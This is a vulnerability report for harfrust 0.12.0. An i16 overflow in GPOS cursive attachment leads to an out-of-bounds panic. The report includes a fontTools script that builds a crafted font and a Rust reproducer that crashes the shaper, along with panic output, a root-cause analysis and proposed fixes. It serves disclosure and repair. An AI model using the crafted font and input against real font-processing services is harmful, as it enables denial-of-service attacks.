# ISSUE — harfrust: `reverse_cursive_minor_offset` out-of-bounds index via i16 attach_chain overflow

**Title:** GPOS cursive attachment: `attach_chain` i16 truncation causes out-of-bounds slice index in `reverse_cursive_minor_offset`

Tested against **`harfrust 0.12.0`** (current crates.io release).

### Summary

`harfrust`'s GPOS cursive-attachment positioning (`CursivePosFormat1::apply`, `src/hb/ot/gpos/cursive.rs`) stores the buffer-index distance between two attached glyphs in a signed 16-bit field (`attach_chain: i16`). When more than 32 767 glyphs separate the attachment pair in the shaping buffer — possible with Arabic text containing a long run of combining marks between two cursively-connecting base letters — the stored distance silently overflows i16 and carries the wrong sign.

A second GPOS cursive lookup on the same glyph pair then calls:

```rust
// cursive.rs:105
reverse_cursive_minor_offset(pos, child, direction, parent);
```

which reads back the now-invalid `attach_chain` and computes:

```rust
// cursive.rs:149 (inside reverse_cursive_minor_offset)
let j = (i as isize + isize::from(chain)) as usize;
```

With `i = 0` (the child glyph is at the start of the buffer) and `chain = -32 767` (the overflowed original distance of 32 769), `j` wraps to `18 446 744 073 709 518 849`. The next line indexes `pos[j]`, which panics with an out-of-bounds error and aborts the process.

### Affected code

```rust
// src/hb/ot/gpos/cursive.rs:107-108
reverse_cursive_minor_offset(pos, child, direction, parent);
pos[child].set_attach_chain((parent as isize - child as isize) as i16);  // truncates silently

// src/hb/ot/gpos/cursive.rs:134-154
fn reverse_cursive_minor_offset(pos, i, direction, new_parent) {
    let chain = pos[i].attach_chain();
    if chain == 0 || attach_type & attach_type::CURSIVE == 0 { return; }
    pos[i].set_attach_chain(0);
    let j = (i as isize + isize::from(chain)) as usize;  // wraps on overflow
    if j == new_parent { return; }
    reverse_cursive_minor_offset(pos, j, direction, new_parent);  // pos[j] OOB in recursive call
    pos[j].y_offset = -pos[i].y_offset;                           // also OOB if j is huge
    ...
}
```

### Dynamic confirmation — public API

**`harfrust 0.12.0`**, confirmed with `cargo run` in a fresh project (no nightly toolchain required, no internal test access). Reproduced on both the stable and experimental API paths, and in both debug and release profiles.

**Crafted font:** a minimal TTF with three mapped glyphs: Ba (U+0628, base), Fathah (U+064E, mark), Meem (U+0645, base). GDEF classifies Fathah as Mark (class 3). GPOS contains two identical CursivePosFormat1 lookups with `LookupFlag = 0x0009` (RightToLeft + IgnoreMarks), both covering Ba and Meem with entry/exit anchors. Both lookups are listed in the `curs` feature. This is a valid GPOS table — nothing the spec forbids.

**Input text:** Ba (U+0628) + 32 768 Fathah marks (U+064E, classified as Mark in GDEF so the cursive lookup's `IGNORE_MARKS` flag skips them) + Meem (U+0645). Buffer layout: Ba at position 0, marks at positions 1–32 768, Meem at position 32 769. Distance = 32 769, overflows `i16::MAX` (32 767).

**Cargo.toml dependency (stable API, no feature flags required):**

```toml
[dependencies]
harfrust = { version = "=0.12.0" }
```

**Reproducer (stable API, no feature flags required):**

```rust
// Cargo.toml: harfrust = "=0.12.0"
fn main() {
    let font_bytes = std::fs::read("crafted_cursive.ttf").unwrap();
    let font_ref = harfrust::FontRef::new(&font_bytes).unwrap();
    let shaper_data = harfrust::ShaperData::new(&font_ref);
    let shaper = shaper_data.shaper(&font_ref).build();

    let mut text = String::from("\u{0628}"); // Ba (cursive base)
    for _ in 0..32768 { text.push('\u{064E}'); } // 32 768 Fathah marks
    text.push('\u{0645}');                    // Meem (second cursive base)

    let mut buffer = harfrust::UnicodeBuffer::new();
    buffer.push_str(&text);
    buffer.set_direction(harfrust::Direction::RightToLeft);
    buffer.set_script(harfrust::script::ARABIC);

    shaper.shape(buffer, harfrust::ShapeOptions::new());
}
```

**Observed result (release profile, `harfrust 0.12.0`):**

```text
thread 'main' panicked at harfrust-0.12.0/src/hb/ot/gpos/cursive.rs:140:17:
index out of bounds: the len is 32770 but the index is 18446744073709518849
stack backtrace:
   3: harfrust::hb::ot::gpos::cursive::reverse_cursive_minor_offset
   4: harfrust::hb::ot::gpos::cursive::reverse_cursive_minor_offset
   5: <CursivePosFormat1 as Apply>::apply
   6: harfrust::hb::ot::lookup::cursive_pos1
   7: harfrust::hb::ot_layout::apply_forward
   8: harfrust::hb::ot_layout::apply_layout_table::<GposTable>
   9: <hb_font_t>::shape_with_plan
  10: <hb_font_t>::shape                                 ← public API entry
```

The wrapped index `18 446 744 073 709 518 849` equals `2⁶⁴ − 32 767`, consistent with an unguarded
`(0_isize + (−32 767_i16 as isize)) as usize` cast.

### Root cause

`set_attach_chain` stores the raw `(parent as isize − child as isize) as i16` with no overflow check. When the signed distance exceeds `i16::MAX` (32 767), the `as i16` cast silently truncates, producing a value with the wrong sign. On the second lookup's REATTACH call, `reverse_cursive_minor_offset` reads the truncated chain, computes `j = (0 + (−32 767)) as usize = 2⁶⁴ − 32 767`, and indexes `pos[j]` — an out-of-bounds access that panics unconditionally (not gated by `overflow-checks`, since this is a slice bounds check).

### Severity

**Medium** — process abort from a crafted font. Any harfrust consumer that shapes text from a caller-supplied font file is affected: the attacker provides (1) a font with two RTL cursive lookups and (2) Arabic text with a long mark run. No memory corruption occurs (Rust bounds-check catches the access and panics), but the process terminates unconditionally — a denial-of-service for font-rendering or font-testing applications.

The minimum mark count for the overflow is 32 768 (one more than `i16::MAX`), which is a plausible run length in Arabic text with heavy vocalization.

### Fix direction

Clamp or reject distances that don't fit in `i16` before storing them, e.g.:

```rust
// Before:
pos[child].set_attach_chain((parent as isize - child as isize) as i16);

// After: treat oversized distances as unattached
let delta = parent as isize - child as isize;
if let Ok(chain) = i16::try_from(delta) {
    pos[child].set_attach_chain(chain);
} else {
    // distance overflows i16: skip attachment, no crash
}
```

Alternatively, add a bounds check in `reverse_cursive_minor_offset` before indexing `pos[j]`:

```rust
let j = (i as isize + isize::from(chain)) as usize;
if j >= pos.len() { return; }
```

### Font-crafting script

The crafted font can be generated with [fontTools](https://github.com/fonttools/fonttools):

```python
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

FEA = """\
@GDEF_Base = [Ba Meem];
@GDEF_Mark = [Fathah];
table GDEF { GlyphClassDef @GDEF_Base, , @GDEF_Mark, ; } GDEF;
feature curs {
    lookup curs_rtl_1 {
        lookupflag RightToLeft IgnoreMarks;
        pos cursive Ba <anchor 0 0> <anchor 500 0>;
        pos cursive Meem <anchor 0 0> <anchor 500 0>;
    } curs_rtl_1;
    lookup curs_rtl_2 {
        lookupflag RightToLeft IgnoreMarks;
        pos cursive Ba <anchor 0 0> <anchor 500 0>;
        pos cursive Meem <anchor 0 0> <anchor 500 0>;
    } curs_rtl_2;
} curs;
"""

fb = FontBuilder(1000, isTTF=True)
fb.setupGlyphOrder([".notdef", "Ba", "Fathah", "Meem"])
fb.setupCharacterMap({0x0628: "Ba", 0x064E: "Fathah", 0x0645: "Meem"})
glyphs = {}
for name in [".notdef", "Ba", "Fathah", "Meem"]:
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0)); pen.lineTo((500, 0))
    pen.lineTo((500, 700)); pen.lineTo((0, 700)); pen.closePath()
    glyphs[name] = pen.glyph()
fb.setupGlyf(glyphs)
fb.setupHorizontalMetrics({".notdef": (500, 0), "Ba": (600, 0), "Fathah": (0, 0), "Meem": (600, 0)})
fb.setupHorizontalHeader()
fb.setupNameTable({"familyName": "CursivePoC", "styleName": "Regular"})
fb.setupOS2(); fb.setupPost(); fb.setupHead(unitsPerEm=1000)
fb.addOpenTypeFeatures(FEA)
fb.font.save("crafted_cursive.ttf")
```

Found with [rust-in-peace](https://github.com/scadastrangelove/rust-in-peace).
